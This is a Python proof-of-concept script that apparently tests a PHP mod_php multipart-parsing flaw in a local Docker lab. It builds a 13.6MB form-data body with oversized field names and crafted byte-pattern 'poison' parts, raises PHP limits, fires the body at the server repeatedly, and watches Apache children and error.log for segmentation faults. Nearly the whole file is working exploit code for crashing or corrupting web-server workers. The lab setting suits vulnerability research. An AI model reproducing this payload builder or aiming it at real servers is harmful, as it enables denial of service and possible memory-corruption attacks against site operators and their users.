#!/usr/bin/env python3
"""oom51: mod_php consumer test v2 — lab ini now includes post_max_size=4096M
so the 13.59MB attack body is actually parsed. Watch: per-fire status/latency,
child census, apache error.log (segv/child-exit lines), robust log reads."""
import re
import subprocess
import sys
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
CONF = "/usr/local/etc/php/conf.d/30-oomlab.ini"
NAMELEN = 3064


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def sh(cmd, timeout=25):
    try:
        r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                           capture_output=True, timeout=timeout)
        return r.stdout.decode("latin1")
    except subprocess.TimeoutExpired:
        return "<<EXEC TIMEOUT>>"


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:150]
    except Exception as e:
        return type(e).__name__, str(e)[:150]


def children():
    out = sh("ps -o pid,ppid -C apache2 2>/dev/null | tail -n +2", 15)
    return sorted(re.findall(r"^\s*(\d+)\s+1\s", out, re.M))


def set_ini():
    sh("printf 'memory_limit=20600000\\nmax_input_vars=100000\\npost_max_size=4096M\\n' > %s" % CONF)
    sh("apachectl -k graceful")
    time.sleep(1.2)


def restore():
    sh("rm -f %s" % CONF)
    sh("apachectl -k graceful")
    time.sleep(1.2)


def main():
    n_fire = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    set_ini()
    try:
        print("[ini]", http("/oom_sapi.php", timeout=10))
        log0 = sh("tail -3 /var/log/apache2/error.log")
        print("[errlog-baseline]", log0.strip()[-200:])
        before = children()
        print("[kids]", before)
        att = build_attack()
        print("[fire] attack %d bytes x%d" % (len(att), n_fire), flush=True)
        for i in range(n_fire):
            t0 = time.time()
            code, text = http("/oom_mod.php", att,
                              "multipart/form-data; boundary=BOUND", 30)
            print("  fire%d: %s %.1fs body=%r" % (i, code, time.time() - t0, text[:80]),
                  flush=True)
            kids = children()
            print("    kids=%s" % kids, flush=True)
            time.sleep(0.4)
        time.sleep(1.5)
        after = children()
        print("[kids-after]", after)
        print("[kids-new]", [p for p in after if p not in before],
              "[kids-gone]", [p for p in before if p not in after])
        log = sh("tail -25 /var/log/apache2/error.log")
        print("[errlog]")
        print(log)
        seg = ("Segmentation fault" in log or "exit signal Segmentation" in log)
        print("[VERDICT] kids_changed=%s segv_in_log=%s" %
              (set(after) != set(before), seg), flush=True)
        print("[alive]", http("/oom_sapi.php", timeout=10))
    finally:
        restore()
        print("[restored]", http("/oom_sapi.php", timeout=10))


if __name__ == "__main__":
    main()
